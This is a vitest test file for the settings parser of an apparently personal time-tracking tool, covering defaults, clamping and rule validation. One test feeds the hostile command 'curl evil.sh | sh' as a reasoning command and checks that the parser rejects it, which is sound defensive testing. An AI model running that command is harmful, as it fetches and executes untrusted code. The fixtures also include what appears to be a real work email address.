import { describe, expect, it } from 'vitest';
import {
  DEFAULT_DAY_TARGET_MS,
  DEFAULT_GAP_FILL_MS,
  DEFAULT_NUDGE_AT_MINUTE,
  DEFAULT_TIMETRACK_SETTINGS,
  MAX_DAY_TARGET_MS,
  MAX_GAP_FILL_MS,
  MAX_MINUTE_OF_DAY,
  MIN_DAY_TARGET_MS,
} from './model';
import { parseTimetrackSettings } from './parse';

describe('parseTimetrackSettings', () => {
  it('reads a document the app wrote', () => {
    const settings = parseTimetrackSettings({
      dayTargetMs: 7 * 60 * 60_000,
      gapFillMs: 10 * 60_000,
      jira: { host: 'ethlete.atlassian.net', email: 'trb@braune-digital.com' },
      google: { clientId: 'client.apps.googleusercontent.com', calendarIds: ['work@example.com'] },
      gitlab: { host: 'git.braune-digital.com' },
      ticket: {
        issueTypeName: 'Aufgabe',
        parentIssueTypeNames: ['Story'],
        parenting: 'issue-link',
        parentLinkType: 'Blocks',
        subjectField: 'customfield_10057',
      },
      reasoning: { enabled: true, command: 'codex', model: 'gpt-5' },
      nudge: { enabled: false, atMinute: 18 * 60 },
      exclusionRules: [{ kind: 'title-pattern', pattern: 'therapy' }],
      keepDefaultExclusionRules: false,
      gitScanRoots: ['/home/tom/dev'],
    });

    expect(settings).toEqual({
      dayTargetMs: 7 * 60 * 60_000,
      gapFillMs: 10 * 60_000,
      jira: { host: 'ethlete.atlassian.net', email: 'trb@braune-digital.com' },
      google: { clientId: 'client.apps.googleusercontent.com', calendarIds: ['work@example.com'] },
      gitlab: { host: 'git.braune-digital.com' },
      ticket: {
        issueTypeName: 'Aufgabe',
        parentIssueTypeNames: ['Story'],
        parenting: 'issue-link',
        parentLinkType: 'Blocks',
        subjectField: 'customfield_10057',
      },
      reasoning: { enabled: true, command: 'codex', model: 'gpt-5' },
      nudge: { enabled: false, atMinute: 18 * 60 },
      exclusionRules: [{ kind: 'title-pattern', pattern: 'therapy' }],
      keepDefaultExclusionRules: false,
      gitScanRoots: ['/home/tom/dev'],
      issueKeyPrefixes: [],
      attributionRules: [],
    });
  });

  it('falls back to the defaults for anything it cannot make sense of', () => {
    expect(parseTimetrackSettings(null)).toEqual({
      dayTargetMs: DEFAULT_DAY_TARGET_MS,
      gapFillMs: DEFAULT_GAP_FILL_MS,
      jira: { host: '', email: '' },
      google: { clientId: '', calendarIds: [] },
      gitlab: { host: '' },
      ticket: DEFAULT_TIMETRACK_SETTINGS.ticket,
      reasoning: DEFAULT_TIMETRACK_SETTINGS.reasoning,
      nudge: { enabled: true, atMinute: DEFAULT_NUDGE_AT_MINUTE },
      exclusionRules: [],
      keepDefaultExclusionRules: true,
      gitScanRoots: [],
      issueKeyPrefixes: [],
      attributionRules: [],
    });
    expect(parseTimetrackSettings({ dayTargetMs: 'eight hours' }).dayTargetMs).toBe(DEFAULT_DAY_TARGET_MS);
  });

  it('keeps a reminder time inside the day, and reminds unless the document turned it off', () => {
    expect(parseTimetrackSettings({ nudge: { atMinute: -30 } }).nudge).toEqual({ enabled: true, atMinute: 0 });
    expect(parseTimetrackSettings({ nudge: { atMinute: 5_000 } }).nudge.atMinute).toBe(MAX_MINUTE_OF_DAY);
    expect(parseTimetrackSettings({ nudge: { enabled: false } }).nudge.atMinute).toBe(DEFAULT_NUDGE_AT_MINUTE);
  });

  it('refuses a reasoning command the host would not run, and stays off unless turned on', () => {
    expect(parseTimetrackSettings({ reasoning: { enabled: true, command: 'curl evil.sh | sh' } }).reasoning).toEqual({
      enabled: true,
      command: DEFAULT_TIMETRACK_SETTINGS.reasoning.command,
      model: '',
    });
    expect(parseTimetrackSettings({ reasoning: { command: 'claude' } }).reasoning.enabled).toBe(false);
  });

  it('refuses a parenting mode the create call cannot execute', () => {
    expect(parseTimetrackSettings({ ticket: { parenting: 'epic-link' } }).ticket.parenting).toBe('parent-field');
  });

  it('tells an empty parent-type list apart from an absent one', () => {
    expect(parseTimetrackSettings({ ticket: { parentIssueTypeNames: [] } }).ticket.parentIssueTypeNames).toEqual([]);
    expect(parseTimetrackSettings({ ticket: {} }).ticket.parentIssueTypeNames).toEqual(
      DEFAULT_TIMETRACK_SETTINGS.ticket.parentIssueTypeNames,
    );
  });

  it('clamps a day target nobody could work', () => {
    expect(parseTimetrackSettings({ dayTargetMs: 0 }).dayTargetMs).toBe(MIN_DAY_TARGET_MS);
    expect(parseTimetrackSettings({ dayTargetMs: 40 * 60 * 60_000 }).dayTargetMs).toBe(MAX_DAY_TARGET_MS);
  });

  it('keeps a gap-fill threshold under the point where a gap stops being a pause', () => {
    expect(parseTimetrackSettings({ gapFillMs: 0 }).gapFillMs).toBe(0);
    expect(parseTimetrackSettings({ gapFillMs: -5 }).gapFillMs).toBe(0);
    expect(parseTimetrackSettings({ gapFillMs: 2 * 60 * 60_000 }).gapFillMs).toBe(MAX_GAP_FILL_MS);
    expect(parseTimetrackSettings({ gapFillMs: 'a while' }).gapFillMs).toBe(DEFAULT_GAP_FILL_MS);
  });

  it('drops a rule with no value but keeps one whose pattern does not compile', () => {
    const settings = parseTimetrackSettings({
      exclusionRules: [
        { kind: 'app-id', appId: '' },
        { kind: 'app-id' },
        { kind: 'nonsense', appId: 'firefox' },
        { kind: 'title-pattern', pattern: '(' },
      ],
    });

    expect(settings.exclusionRules).toEqual([{ kind: 'title-pattern', pattern: '(' }]);
  });

  it('reads an attribution rule and revives the instant it was written', () => {
    const settings = parseTimetrackSettings({
      attributionRules: [
        {
          id: 'rule-1',
          repoPath: '/home/tom/dev/ea-frontend',
          branch: 'next',
          target: { kind: 'issue', issueKey: 'FIP-100' },
          createdAt: '2026-08-01T00:00:00.000Z',
        },
      ],
    });

    expect(settings.attributionRules).toEqual([
      {
        id: 'rule-1',
        repoPath: '/home/tom/dev/ea-frontend',
        branch: 'next',
        appId: undefined,
        target: { kind: 'issue', issueKey: 'FIP-100' },
        createdAt: new Date('2026-08-01T00:00:00.000Z'),
      },
    ]);
  });

  it('drops an attribution rule that names no context or no issue', () => {
    const settings = parseTimetrackSettings({
      attributionRules: [
        { target: { kind: 'issue', issueKey: 'FIP-100' } },
        { repoPath: '/home/tom/dev/ea-frontend' },
        {},
      ],
    });

    expect(settings.attributionRules).toEqual([]);
  });

  it('trims and de-duplicates the scan roots', () => {
    expect(parseTimetrackSettings({ gitScanRoots: [' /home/tom/dev ', '/home/tom/dev', '', 7] }).gitScanRoots).toEqual([
      '/home/tom/dev',
    ]);
  });

  it('trims and de-duplicates the calendar ids the same way', () => {
    const google = { calendarIds: [' work@example.com ', 'work@example.com', '', 7] };

    expect(parseTimetrackSettings({ google }).google.calendarIds).toEqual(['work@example.com']);
  });

  it('keeps the shipped rules unless the document says otherwise', () => {
    expect(parseTimetrackSettings({}).keepDefaultExclusionRules).toBe(true);
    expect(parseTimetrackSettings({ keepDefaultExclusionRules: false }).keepDefaultExclusionRules).toBe(false);
  });
});
